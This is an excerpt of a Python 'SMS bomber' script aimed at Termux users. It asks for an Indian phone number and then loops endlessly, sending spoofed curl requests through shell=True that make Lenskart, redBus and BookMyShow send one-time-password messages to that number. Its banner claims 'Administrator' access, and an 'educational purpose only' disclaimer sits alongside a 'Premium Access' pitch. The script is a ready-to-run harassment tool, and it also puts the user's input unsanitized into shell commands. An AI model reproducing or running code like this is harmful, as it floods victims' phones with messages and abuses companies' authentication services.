...
def banner():
    ...
    print(f"""
{C_BOX} ╔══════════════════════════════════════════╗{RESET}
{C_BOX} ║{C_TITLE}         • @BeStChEaT_OwNeR •              {C_BOX}║{RESET}
{C_BOX} ╠══════════════════════════════════════════╣{RESET}
{C_BOX} ║ {C_LABEL} > User Access  : {C_VALUE}Administrator          {C_BOX}║{RESET}
{C_BOX} ║ {C_LABEL} > Connectivity : {C_VALUE}Secure (TLS)           {C_BOX}║{RESET}
{C_BOX} ║ {C_LABEL} > Latency      : {C_VALUE}24ms                   {C_BOX}║{RESET}
{C_BOX} ╚══════════════════════════════════════════╝{RESET}
{C_WARN}  [!] System Ready.{RESET}
""")
    ...
    while True:
        try:
            ...
            subprocess.Popen(
                ...
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(
                '''curl -X POST -H "Host:api.lenskart.com" -H "content-length:26" -H "origin:https://www.lenskart.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json;charset=UTF-8" -H "accept:application/json, text/plain, */*" -H "x-api-client:mobilesite" -H "referer:https://www.lenskart.com/customer/account/login" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -d '{"telephone":"''' + target + '''"}' "https://api.lenskart.com/v2/customers/sendOtp" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(
                '''curl -X GET -H "Host:m.redbus.in" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" "https://m.redbus.in/api/getOtp?number=''' + target + '''&cc=91" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(
                '''curl -X POST -H "Host:in.bookmyshow.com" -H "content-length:108" -H "accept:application/json" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://in.bookmyshow.com" -d '{"channel":"phone","subChannel":"sms","details":{"phone":"''' + target + '''","origin":"https://in.bookmyshow.com"}}' "https://in.bookmyshow.com/pwa/api/uapi/otp/send" > /dev/null 2>&1''',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
...
if __name__ == '__main__':
    if len(sys.argv) > 1:
        ...
        if len(target) == 10 and target.isdigit():
            print(f"[!] Bot bombing started on +91{target}")
            infinite(target)
    else:
        # Termux direct
        color = random.choice(colors)
        banner()
        print(f"{C_LABEL} ➤ Created By: {C_VALUE} @BeStChEaT_OwNeR {RESET}")
        print(f"{C_LABEL} ➤ {C_WARN}For Educational Purpose Only{RESET}")
        print(f"{C_LABEL} ➤ {C_RED} Premium Access{RESET}\n")
        t = input("Enter Target Phone No.: +91")
        if len(t) == 10 and t.isdigit():
            print(color + "\n[!] Bombing started. Press Ctrl+C to stop.\n")
            try:
                infinite(t)
